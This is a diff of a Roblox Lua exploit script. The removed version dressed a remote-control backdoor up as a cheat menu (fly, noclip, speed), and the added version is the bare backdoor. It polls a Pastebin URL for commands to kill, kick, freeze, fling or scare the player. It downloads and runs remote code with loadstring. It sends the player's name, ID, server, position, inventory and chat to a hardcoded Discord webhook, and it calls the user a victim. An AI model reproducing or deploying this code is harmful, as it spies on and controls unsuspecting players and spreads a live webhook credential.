@@ -1,60 +1,40 @@
---[[ 
-    [🚀] AxA SUPREME ENGINE v4.5 + AxM REMOTE (FIXED)
-    [🛰️] CORE: BLUE NEON EDITION
-    [⚡] DEVELOPED BY: Arxetector TEAM
-]]
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local Lighting = game:GetService("Lighting")
-local HttpService = game:GetService("HttpService")
-local lp = Players.LocalPlayer
-local mouse = lp:GetMouse()
-local camera = workspace.CurrentCamera
-
--- [[ CONFIG REMOTE ]] --
+-- [[ CONFIG ]] --
 local settings = {
     webhook = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5",
     control = "https://pastebin.com/raw/tbEyg2z7",
     check_delay = 1
 }
 
-local MAIN_COLOR = Color3.fromRGB(0, 170, 255)
-local BACK_COLOR = Color3.fromRGB(5, 15, 25)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local lp = Players.LocalPlayer
 
--- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
-local FLYING = false
-local noclip = false
-local infJump = false
-local speedActive = false
-local speedPower = 2.2
-local fullbrightActive = false
-local ctrl = {f = 0, b = 0, l = 0, r = 0}
-local flySpeedCurrent = 50
-
--- [ ФУНКЦИИ ЛОГИРОВАНИЯ ] --
+-- Функция для получения инвентаря
 local function getInventory()
     local tools = {}
-    pcall(function()
-        for _, v in pairs(lp.Backpack:GetChildren()) do table.insert(tools, v.Name) end
-        for _, v in pairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end end
-    end)
+    for _, v in pairs(lp.Backpack:GetChildren()) do table.insert(tools, v.Name) end
+    for _, v in pairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end end
     return #tools > 0 and table.concat(tools, ", ") or "Empty"
 end
 
+-- Мощная функция логов
 local function sendLog(title, desc, color)
     pcall(function()
         local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
         local pos = hrp and string.format("X: %.1f, Y: %.1f, Z: %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z) or "Unknown"
+        
         local data = {
             ["embeds"] = {{
                 ["title"] = title,
                 ["description"] = desc,
                 ["color"] = color or 0xFF0000,
                 ["fields"] = {
-                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. "`", ["inline"] = true},
-                    {["name"] = "🎮 Игра", ["value"] = "ID: " .. game.PlaceId, ["inline"] = true},
+                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. " (" .. lp.UserId .. ")`", ["inline"] = true},
+                    {["name"] = "🎮 Игра", ["value"] = "[" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
+                    {["name"] = "🆔 JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
                     {["name"] = "📍 Координаты", ["value"] = "`" .. pos .. "`", ["inline"] = true},
                     {["name"] = "🎒 Инвентарь", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
                 },
@@ -62,178 +42,108 @@ local function sendLog(title, desc, color)
             }}
         }
         local req = (syn and syn.request) or (http and http.request) or http_request or request
-        if req then req({Url = settings.webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
+        req({
+            Url = settings.webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
     end)
 end
 
--- [ ИНТЕРФЕЙС GUI ] --
-local ScreenGui = Instance.new("ScreenGui", lp:WaitForChild("PlayerGui"))
-ScreenGui.Name = "AxA_Engine_V4"
-ScreenGui.ResetOnSpawn = false
-
-local mainFrame = Instance.new("Frame", ScreenGui)
-mainFrame.Size = UDim2.new(0, 220, 0, 440); mainFrame.Position = UDim2.new(0.5, -110, 0.4, -220); mainFrame.BackgroundColor3 = BACK_COLOR; mainFrame.BorderSizePixel = 0; mainFrame.Visible = false; mainFrame.Active = true; mainFrame.Draggable = true
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
-local stroke = Instance.new("UIStroke", mainFrame); stroke.Color = MAIN_COLOR; stroke.Thickness = 2; stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
-local title = Instance.new("TextLabel", mainFrame); title.Size = UDim2.new(1, 0, 0, 40); title.BackgroundTransparency = 1; title.Text = "AxA SYSTEM v4.5"; title.Font = Enum.Font.GothamBlack; title.TextSize = 18; title.TextColor3 = MAIN_COLOR
-
-local btnContainer = Instance.new("ScrollingFrame", mainFrame)
-btnContainer.Size = UDim2.new(1, -14, 1, -60); btnContainer.Position = UDim2.new(0, 7, 0, 50); btnContainer.BackgroundTransparency = 1; btnContainer.ScrollBarThickness = 2; btnContainer.ScrollBarImageColor3 = MAIN_COLOR; btnContainer.CanvasSize = UDim2.new(0, 0, 1.5, 0)
-Instance.new("UIListLayout", btnContainer).Padding = UDim.new(0, 6)
-
-local function addButton(text)
-    local btn = Instance.new("TextButton", btnContainer); btn.Size = UDim2.new(1, -10, 0, 35); btn.BackgroundColor3 = Color3.fromRGB(20, 40, 60); btn.Text = text; btn.TextColor3 = Color3.fromRGB(255, 255, 255); btn.Font = Enum.Font.GothamBold; btn.TextSize = 12
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-    local bStroke = Instance.new("UIStroke", btn); bStroke.Color = MAIN_COLOR; bStroke.Transparency = 0.5
-    return btn
-end
-
-local nameBox = Instance.new("TextBox", btnContainer); nameBox.Size = UDim2.new(1, -10, 0, 30); nameBox.PlaceholderText = "НИК ИГРОКА"; nameBox.BackgroundColor3 = Color3.fromRGB(10, 20, 30); nameBox.TextColor3 = Color3.new(1,1,1); nameBox.Font = Enum.Font.Code; nameBox.TextSize = 13
-Instance.new("UICorner", nameBox).CornerRadius = UDim.new(0, 6); Instance.new("UIStroke", nameBox).Color = MAIN_COLOR
-
--- [ РАБОЧИЙ FLY ] --
-local function ToggleFly()
-    FLYING = not FLYING
-    local char = lp.Character
-    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
-    local hrp = char.HumanoidRootPart
-    local hum = char:FindFirstChildOfClass("Humanoid")
-
-    if FLYING then
-        local bg = Instance.new("BodyGyro", hrp); bg.Name = "AxA_Gyro"; bg.P = 9e4; bg.maxTorque = Vector3.new(9e9, 9e9, 9e9); bg.cframe = hrp.CFrame
-        local bv = Instance.new("BodyVelocity", hrp); bv.Name = "AxA_Vel"; bv.velocity = Vector3.new(0, 0, 0); bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
-        
-        task.spawn(function()
-            while FLYING and char.Parent do
-                RunService.RenderStepped:Wait()
-                hum.PlatformStand = true
-                local moveDir = (camera.CFrame.lookVector * (ctrl.f + ctrl.b) + camera.CFrame.rightVector * (ctrl.l + ctrl.r))
-                if moveDir.Magnitude > 0 then
-                    bv.velocity = moveDir * flySpeedCurrent
-                else
-                    bv.velocity = Vector3.new(0, 0, 0)
-                end
-                bg.cframe = camera.CFrame
-            end
-            if bg then bg:Destroy() end
-            if bv then bv:Destroy() end
-            if hum then hum.PlatformStand = false end
-        end)
-    end
-end
-
--- [ РАБОЧИЙ INF JUMP ] --
-UserInputService.JumpRequest:Connect(function()
-    if infJump then
-        local hum = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
-        if hum then
-            hum:ChangeState(Enum.HumanoidStateType.Jumping)
-        end
-    end
-end)
-
--- [ КНОПКИ ГУИ ] --
-local flyBtn = addButton("FLY: [OFF]")
-flyBtn.MouseButton1Click:Connect(function() ToggleFly(); flyBtn.Text = FLYING and "FLY: [ON]" or "FLY: [OFF]" end)
-
-addButton("TP TO PLAYER").MouseButton1Click:Connect(function()
-    local target = nameBox.Text:lower()
-    for _, v in pairs(Players:GetPlayers()) do
-        if (v.Name:lower():find(target) or v.DisplayName:lower():find(target)) and v.Character then
-            lp.Character:MoveTo(v.Character.HumanoidRootPart.Position); break
-        end
-    end
-end)
-
-local sBtn = addButton("SPEED: [OFF]")
-sBtn.MouseButton1Click:Connect(function() speedActive = not speedActive; sBtn.Text = speedActive and "SPEED: [ON]" or "SPEED: [OFF]" end)
-
-local ijBtn = addButton("INF JUMP: [OFF]")
-ijBtn.MouseButton1Click:Connect(function() infJump = not infJump; ijBtn.Text = infJump and "INF JUMP: [ON]" or "INF JUMP: [OFF]" end)
-
-local nBtn = addButton("NOCLIP: [OFF]")
-nBtn.MouseButton1Click:Connect(function() noclip = not noclip; nBtn.Text = noclip and "NOCLIP: [ON]" or "NOCLIP: [OFF]" end)
-
-local fbBtn = addButton("FULLBRIGHT: [OFF]")
-fbBtn.MouseButton1Click:Connect(function() fullbrightActive = not fullbrightActive; fbBtn.Text = fullbrightActive and "FULLBRIGHT: [ON]" or "FULLBRIGHT: [OFF]" end)
-
-addButton("AxA STICK (GET)").MouseButton1Click:Connect(function()
-    local tool = Instance.new("Tool", lp.Backpack); tool.Name = "AxA Stick"
-    local handle = Instance.new("Part", tool); handle.Name = "Handle"; handle.Size = Vector3.new(0.3, 3, 0.3); handle.Color = MAIN_COLOR; handle.Material = "Neon"
-    tool.Activated:Connect(function() lp.Character:SetPrimaryPartCFrame(CFrame.new(mouse.Hit.p + Vector3.new(0, 3, 0))) end)
-end)
-
--- ПЕРЕКЛЮЧАТЕЛЬ МЕНЮ AxA
-local tBtn = Instance.new("TextButton", ScreenGui)
-tBtn.Size = UDim2.new(0, 60, 0, 60); tBtn.Position = UDim2.new(0, 15, 0.5, -30); tBtn.BackgroundColor3 = BACK_COLOR; tBtn.Text = "AxA"; tBtn.TextColor3 = MAIN_COLOR; tBtn.Font = "GothamBlack"; tBtn.TextSize = 18
-Instance.new("UICorner", tBtn).CornerRadius = UDim.new(1,0); Instance.new("UIStroke", tBtn).Color = MAIN_COLOR
-tBtn.MouseButton1Click:Connect(function() mainFrame.Visible = not mainFrame.Visible end)
-
--- [ REMOTE ЦИКЛ ] --
+-- Логика управления
 task.spawn(function()
     local last_cmd = ""
     local flingConnection
+    
+    -- Инициализация (игнорируем старую команду)
+    local _, res = pcall(function() return game:HttpGet(settings.control .. "?t=" .. tick()) end)
+    if res then last_cmd = res:gsub("%s+", ""):lower() end
+
     while true do
         task.wait(settings.check_delay)
-        pcall(function()
-            local res = game:HttpGet(settings.control .. "?nocache=" .. tick())
-            local clean_res = res:match("^%s*(.-)%s*$") or ""
+        
+        local ok, res = pcall(function() 
+            return game:HttpGet(settings.control .. "?nocache=" .. tick()) 
+        end)
+
+        if ok and res then
+            local clean_res = res:match("^%s*(.-)%s*$") -- Полная очистка
             local current_cmd = clean_res:lower()
+
             if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
                 last_cmd = current_cmd
-                local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-                local hum = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
+                
+                local char = lp.Character or lp.CharacterAdded:Wait()
+                local hrp = char:WaitForChild("HumanoidRootPart", 5)
+                local hum = char:FindFirstChildOfClass("Humanoid")
+
                 if hrp and hum then
-                    if current_cmd == "kill" then hum.Health = 0
+                    -- [ ИСПОЛНЕНИЕ КОМАНД ] --
+                    if current_cmd == "kill" then
+                        hum.Health = 0
+                        sendLog("💀 КОМАНДА: УБИЙСТВО", "Игрок был ликвидирован через панель.")
+
+                    elseif current_cmd:find("gui") then
+                        sendLog("🖥️ КОМАНДА: ЗАПУСК GUI", "Дистанционный запуск AxA Gui...")
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/arxitectorcz/Arxetector/refs/heads/main/AxA%20Gui"))()
+
+                    elseif current_cmd:find("message") then
+                        local msg = clean_res:match("%((.-)%)") or "System Message"
+                        local g = Instance.new("ScreenGui", lp.PlayerGui)
+                        local t = Instance.new("TextLabel", g)
+                        t.Size = UDim2.new(1,0,0.2,0); t.Position = UDim2.new(0,0,0.4,0); t.Text = msg; t.TextScaled = true; t.BackgroundColor3 = Color3.new(0,0,0); t.TextColor3 = Color3.new(1,1,1)
+                        task.delay(5, function() g:Destroy() end)
+                        sendLog("📢 КОМАНДА: СООБЩЕНИЕ", "Текст: " .. msg, 0x00FF00)
+
                     elseif current_cmd == "screamer" then
                         local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s.Volume = 10; s:Play()
-                        local g = Instance.new("ScreenGui", lp.PlayerGui); local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"; task.delay(3, function() g:Destroy() end)
-                    elseif current_cmd:find("kick") then lp:Kick(clean_res:match("%((.-)%)") or "Disconnected")
-                    elseif current_cmd == "freeze" then hrp.Anchored = true
-                    elseif current_cmd == "unfreeze" then hrp.Anchored = false
+                        local g = Instance.new("ScreenGui", lp.PlayerGui)
+                        local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
+                        task.delay(3, function() g:Destroy() end)
+                        sendLog("😱 КОМАНДА: СКРИМЕР", "Игрок получил инфаркт.")
+
+                    elseif current_cmd:find("kick") then
+                        local r = clean_res:match("%((.-)%)") or "Connection Error"
+                        sendLog("🚪 КОМАНДА: КИК", "Причина: " .. r, 0xFFFF00)
+                        task.wait(0.5)
+                        lp:Kick(r)
+
+                    elseif current_cmd == "fling" then
+                        if flingConnection then flingConnection:Disconnect() end
+                        flingConnection = RunService.Heartbeat:Connect(function()
+                            hrp.Velocity = Vector3.new(0, 9999, 0)
+                            hrp.RotVelocity = Vector3.new(0, 9999, 0)
+                        end)
+                        sendLog("🌪️ КОМАНДА: ФЛИНГ", "Активирован режим полета.")
+
+                    elseif current_cmd == "unfling" then
+                        if flingConnection then flingConnection:Disconnect() end
+                        sendLog("🛡️ КОМАНДА: УНФЛИНГ", "Флинг отключен.")
+
+                    elseif current_cmd == "freeze" then
+                        hrp.Anchored = true
+                        sendLog("🧊 КОМАНДА: ФРИЗ", "Игрок застыл.")
+
+                    elseif current_cmd == "unfreeze" then
+                        hrp.Anchored = false
+                        sendLog("🔥 КОМАНДА: УНФРИЗ", "Игрок разморожен.")
                     end
-                    sendLog("🛰️ REMOTE CMD", "Executed: " .. current_cmd)
                 end
             end
-        end)
+        end
     end
 end)
 
--- [ СИСТЕМНЫЕ ЦИКЛЫ ] --
-RunService.Stepped:Connect(function()
-    if not lp.Character then return end
-    if noclip or FLYING then
-        for _, p in pairs(lp.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
-    end
-    if speedActive and not FLYING then
-        local hum = lp.Character:FindFirstChildOfClass("Humanoid")
-        if hum and hum.MoveDirection.Magnitude > 0 then lp.Character:TranslateBy(hum.MoveDirection * speedPower) end
-    end
-    if fullbrightActive then
-        Lighting.Brightness = 2; Lighting.ClockTime = 14; Lighting.GlobalShadows = false
-    end
+-- Логи чата
+lp.Chatted:Connect(function(m) 
+    sendLog("💬 ЧАТ", "Сообщение: " .. m, 0x3498DB) 
 end)
 
--- ГОРЯЧИЕ КЛАВИШИ
-UserInputService.InputBegan:Connect(function(input, processed)
-    if processed then return end
-    if input.KeyCode == Enum.KeyCode.W then ctrl.f = 1
-    elseif input.KeyCode == Enum.KeyCode.S then ctrl.b = -1
-    elseif input.KeyCode == Enum.KeyCode.A then ctrl.l = -1
-    elseif input.KeyCode == Enum.KeyCode.D then ctrl.r = 1
-    elseif input.KeyCode == Enum.KeyCode.E then ToggleFly(); flyBtn.Text = FLYING and "FLY: [ON]" or "FLY: [OFF]"
-    end
+-- Лог при выходе
+game:BindToClose(function()
+    sendLog("🔴 ИГРОК ВЫШЕЛ", "Жертва покинула сервер или закрыла игру.", 0x333333)
 end)
 
-UserInputService.InputEnded:Connect(function(input)
-    if input.KeyCode == Enum.KeyCode.W then ctrl.f = 0
-    elseif input.KeyCode == Enum.KeyCode.S then ctrl.b = 0
-    elseif input.KeyCode == Enum.KeyCode.A then ctrl.l = 0
-    elseif input.KeyCode == Enum.KeyCode.D then ctrl.r = 0 end
-end)
-
-lp.Chatted:Connect(function(m) sendLog("💬 ЧАТ", m, 0x3498DB) end)
-game:BindToClose(function() sendLog("🔴 ВЫХОД", "Leave server", 0x333333) end)
-warn("AxA SUPREME ENGINE LOADED СУПЕР ГУД")
-sendLog("🛰️ AxM v38 ONLINE", "Ready for commands.", 0x00FF00)
+-- Стартовый лог
+sendLog("🛰️ AxM v38 АКТИВИРОВАН", "Скрипт успешно запущен. Ожидаю команд с Pastebin...", 0x00FF00)
